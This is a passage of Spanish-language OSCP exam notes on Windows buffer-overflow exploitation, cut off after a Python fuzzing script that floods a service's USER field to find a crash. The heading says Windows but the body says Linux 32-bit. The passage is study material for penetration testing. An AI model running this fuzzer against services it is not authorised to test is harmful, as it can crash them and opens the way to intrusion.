# Apuntes de Preparación para el OSCP

![OSCP Image](http://funkyimg.com/i/2MPB4.png)
#### Penetration Testing with Kali Linux (PWK) course and Offensive Security Certified Professional (OSCP) Cheat Sheet

## Índice y Estructura Principal
- [Buffer Overflow Windows](#Buffer-Overflow-Windows)

Buffer Overflow Windows
===============================================================================================================================
A continuación, se listan los pasos a seguir para la correcta explotación de Buffer Overflow en Linux (32 bits). Para la examinación, no se requieren de conocimientos avanzados de exploiting en BoF (bypassing ASLR, etc.), basta con practicar con servicios básicos y llevar esa misma metodología al examen.

Servicios/Máquinas con los que practicar:

-   SLMail 5.5 
-   Minishare 1.4.1
-   Máquina Brainpan de VulnHub
-   Los 2 binarios personalizados compartidos en la máquina Windows personal del laboratorio

Generalmente, la metodología a seguir es la siguiente:

-   Fuzzing

Para esta fase, es necesario en primer lugar identificar el campo en el que se produce el buffer overflow. Para un caso práctico, suponiendo por ejemplo que un servicio sobre un Host 192.168.1.45 corre bajo el puerto 4000 y que tras la conexión vía TELNET desde nuestra máquina, se nos solicita un campo USER a introducir, podemos elaborar el siguiente script en python con el objetivo de determinar si se produce un desbordamiento de búffer:

```python
#!/usr/bin/python
# coding: utf-8

import sys,socket

if len(sys.argv) != 2:
  print "\nUso: python" + sys.argv[0] + " <dirección-ip>\n"
  sys.exit(0)

buffer = ["A"]
ipAddress = sys.argv[1]

port = 4000
contador = 100

while len(buffer) < 30:
  buffer.append("A"*contador)
  contador += 200
  
for strings in buffer:
  try:
    print "Enviando %s bytes..." % len(strings)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ipAddress, port))
    s.recv(1024)
    s.send("USER " + strings + '\r\n')
    s.recv(1024)
    s.close()
  except:
    print "\nError de conexión...\n"
    sys.exit(0)

```
De esta forma
